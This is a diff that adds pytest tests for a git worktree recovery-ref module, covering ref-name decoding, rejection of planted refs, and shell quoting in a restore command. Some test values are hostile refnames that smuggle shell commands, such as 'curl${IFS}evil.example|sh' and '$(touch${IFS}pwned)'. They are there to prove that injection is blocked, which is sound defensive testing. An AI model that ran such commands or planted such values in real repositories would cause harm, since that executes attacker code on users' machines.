@@ -142,6 +142,66 @@ def test_snapshot_never_raises(tmp_path):
     assert worktrees.snapshot_recovery_ref(str(tmp_path / "nope"), S1, reason="drain") is None
 
 
+def test_recovery_ref_entries_decode_reason_sha_and_time_from_the_name(wt, repo):
+    """D-21: each ref's reason and creation time come from its ``<ts>-<reason>`` name
+    and its sha from the same for-each-ref pass; ``recovery_refs`` lists the same refs
+    in the same order."""
+    from datetime import datetime, timezone
+    _dirty(Path(wt.path))
+    before = datetime.now(timezone.utc)
+    ref = worktrees.snapshot_recovery_ref(wt.path, S1, reason="drain")
+    assert ref is not None
+    entries = worktrees.recovery_ref_entries(str(repo), S1)
+    assert [e.ref for e in entries] == worktrees.recovery_refs(str(repo), S1) == [ref]
+    (entry,) = entries
+    assert entry.reason == "drain"
+    assert entry.sha == _git("rev-parse", ref, cwd=repo)
+    assert before.replace(microsecond=0) <= entry.created_at <= datetime.now(timezone.utc)
+
+
+#: Refs anyone with the worktree can plant under a session's namespace. Each is a
+#: legal git refname; none was written by ``_write_recovery_ref``.
+PLANTED_LEAVES = (
+    "legacy",
+    "x;curl${IFS}evil.example|sh",
+    "$(touch${IFS}pwned)-drain",
+    "20261106T141853893363Z-drain;id",
+    "20261106T141853893363Z-bogus",
+    "`id`/20261106T141853893363Z-drain",
+)
+
+
+def test_planted_recovery_refs_are_never_listed(wt, repo):
+    """D-21 review: only ``<utc-ts>-<reason>`` leaves of safe characters, directly
+    under the session's namespace, are recovery refs — a planted name never reaches
+    ``recovery_refs`` (discard, repair, preflight) or ``restore_command``."""
+    head = _git("rev-parse", "HEAD", cwd=repo)
+    ns = f"{worktrees.RECOVERY_REF_NS}/aaaa0001"
+    for leaf in PLANTED_LEAVES:
+        _git("update-ref", f"{ns}/{leaf}", head, cwd=repo)
+    assert worktrees.recovery_refs(str(repo), S1) == []
+    assert worktrees.recovery_ref_entries(str(repo), S1) == []
+    _dirty(Path(wt.path))
+    ref = worktrees.snapshot_recovery_ref(wt.path, S1, reason="drain")
+    assert worktrees.recovery_refs(str(repo), S1) == [ref]
+
+
+def test_recovery_ref_entries_is_none_when_git_cannot_list(tmp_path):
+    assert worktrees.recovery_ref_entries(str(tmp_path), S1) is None
+    assert worktrees.recovery_refs(str(tmp_path), S1) == []
+
+
+def test_restore_command_shell_quotes_the_ref():
+    import shlex
+    evil = "refs/viberpit/recovery/a/x;curl${IFS}evil|sh"
+    cmd = worktrees.restore_command(evil)
+    assert f"--source={shlex.quote(evil)} " in cmd
+    assert shlex.split(cmd.split(" && ")[0])[2] == f"--source={evil}"
+    ok = f"{worktrees.RECOVERY_REF_NS}/a/20261106T141853893363Z-drain"
+    assert worktrees.restore_command(ok) == (
+        f"git restore --source={ok} --worktree --staged -- . && git reset")
+
+
 def test_refs_are_keyed_on_the_short_session_id(wt, repo):
     """Janitor/default callers only know the worktree dir name (the short id);
     every writer and reader must land in the same namespace."""
